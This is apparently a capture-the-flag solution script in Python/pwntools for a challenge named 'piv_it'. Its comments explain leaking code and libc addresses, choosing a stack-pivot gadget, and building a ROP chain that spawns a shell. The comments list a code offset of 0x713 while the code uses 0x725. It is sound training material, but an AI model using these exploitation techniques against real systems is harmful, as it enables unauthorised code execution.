#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# Based on the name of the challenge, I assumed I would have to use stack pivoting.
# I first discovered that if I overwrote the second buffer it seg faults. Hence, this
# suggests we can overwrite the return address of the second buffer to jump to the
# first buffer, in which we could place a ROP chain.

# If we overwrite the second buffer with a cyclic sequence, it attempts to return to
# address 0x61616169, which is at an offset of 32 in the sequence. So, we want to place
# a stack pivot gadget at offset 32 in the second buffer. Since PIE is enabled, the
# addresses of gadgets in the binary will change each time, so we need a code region
# leak.

# Luckily, the program leaks a code region address. Using this leak, we can find the
# base address by using vmmap and subtracting the base shown there from our leak to
# get the offset 0x713.

# Now to get a pivot gadget, we can use the command 'ropper -f piv_it --stack-pivot',
# which will display any gadgets that modify the esp register. To test which gadget
# will successfully jump us to our first buffer, I filled the first buffer with 'A'
# characters. If we connect our script to gdb right before we send a pivot gadget,
# we can see esp is at 0xff831e00. Using the command 'stack 500' in gdb, we can then
# see our buffer (made recognisable by a bunch of 'A' characters) is at 0xff832088.
# Hence, we need to add 0xff832088 - 0xff831e00 = 0x288 to esp to reach our buffer.

# After trying several pivot gadgets which either didn't reach the buffer, or went
# past the buffer, I found the following gadget:
# pivot 0x00000687 ('add esp, 0xec; add esp, 0x19c; ret;')
# Since 0xec + 0x19c = 0x288, this is the exact offset we need to get esp to the start 
# of our buffer. To confirm this, if we enter this gadget as input into the second
# buffer, it attempts to execute 0x41414141 (or 'AAAA'), which is the contents of our
# buffer.

# Now, instead of filling our first buffer with 'A' characters, we can instead place 
# a ROP chain using libc gadgets to pop a shell. To do this locally, we note the
# program leaks a libc address, so we can use vmmap and subtract the libc base shown 
# there from our leak to get the offset 0x513a0. Given the libc base, we are free to
# use any libc gadgets to construct our ROP chain and place this in our first buffer.

# At this point, if I run my script locally it pops a shell as required. However,
# remotely this fails to work. So, I need to determine the version of libc being used
# on this remote server. To do so, I know through looking in binary ninja that the
# libc address leaked is for the function printf. Also, if we access the binary 
# remotely, our libc leak is now the address '0xf759c2d0'.

# Given a function and its leaked libc address, we can use a libc database (such as
# 'libc.nullbyte.cat'), and enter 'printf' as the function and the last three digits
# of the address '0xf759c2d0' as the offset (so '2d0'). When doing so, we are given 
# multiple matches. Since all other libc versions had extra prefixes or suffixes, I 
# decided to test 'libc6_2.27-3ubuntu1_i386' first. If we click this, it displays the 
# printf offset as '0x0512d0', so we can subtract this from our libc leak to get the 
# libc base.

# Now, it also gives us the option to download this libc version. After doing so, we
# can use ropper on this file to get the offsets for our ROP chain gadgets, and can
# update our payload accordingly. If we now try run the script remotely, our ROP 
# chain executes successfully and pops a shell.

# NOTE: check yunsar script in same directory for another method of solving this.

# The script:
PROGNAME = "challenges/./piv_it"
REMOTEIP = "plsdonthaq.me"
REMOTEPORT = 8002

if args.REMOTE:
    p = remote(REMOTEIP, REMOTEPORT)
    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf

# Extracting the libc leak.
p.recvuntil("At: ")
libc_leak = int(p.recvline()[:-1], 0)
log.info("libc leak is: {}".format(hex(libc_leak)))

# Since my local machine and the remote server use different libc versions, the offset
# for printf is different for each.
if args.REMOTE:
    printf_offset = 0x0512d0
else:
    printf_offset = 0x513a0

# Given this libc leak and the libc offset for printf, we can now calculate the libc
# base.
libc_base = libc_leak - printf_offset
log.info("libc base is: {}".format(hex(libc_base)))

# Once again, since different versions of libc are used locally and remotely, the libc
# offsets for these gadgets differ.
if args.REMOTE:
    xor_eax = p32(libc_base + 0x0002e485)
    inc_eax = p32(libc_base + 0x00008aac)
    pop_ebx = p32(libc_base + 0x00018be5)
    bin_sh = p32(libc_base + 0x0017e0cf)
    pop_ecx_edx = p32(libc_base + 0x0002d54c)
    int_80 = p32(libc_base + 0x00002d37)
else:
    xor_eax = p32(libc_base + 0x0002e4d5)
    inc_eax = p32(libc_base + 0x00024b68)
    pop_ebx = p32(libc_base + 0x00018bf5)
    bin_sh = p32(libc_base + 0x0017e3cf)
    pop_ecx_edx = p32(libc_base + 0x0002d59c)
    int_80 = p32(libc_base + 0x00002d37)

# Once we have the addresses for all our gadgets, we can construct a ROP chain to
# pop a shell.
payload = (
    xor_eax + # xor eax, eax; ret;
    inc_eax * 11 + # inc eax; ret;
    pop_ebx + # pop ebx; ret;
    bin_sh +
    pop_ecx_edx + # pop ecx; pop edx; ret;
    p32(0) +
    p32(0) +
    int_80 # int 0x80;
)

# We then input our ROP chain into the first buffer.
p.sendline(payload)

# Extracting the code region leak.
p.recvuntil("At: ")
code_leak = int(p.recvline()[:-1], 0)
log.info("code leak is: {}".format(hex(code_leak)))

# We subtract our calculated offset from the leak to get the code region base address.
code_base = code_leak - 0x725
log.info("code base is: {}".format(hex(code_base)))

# Next, we add our pivot gadget's offset to the code base.
pivot = p32(code_base + 0x00000687)

# Finally we overwrite the return address with our pivot gadget, which will set the
# esp to point to our first buffer containing a ROP chain.
p.sendline(flat({
 32: pivot # add esp, 0xec; add esp, 0x19c; ret;
}))

# Now we have shell access, we can get the flag.
p.interactive()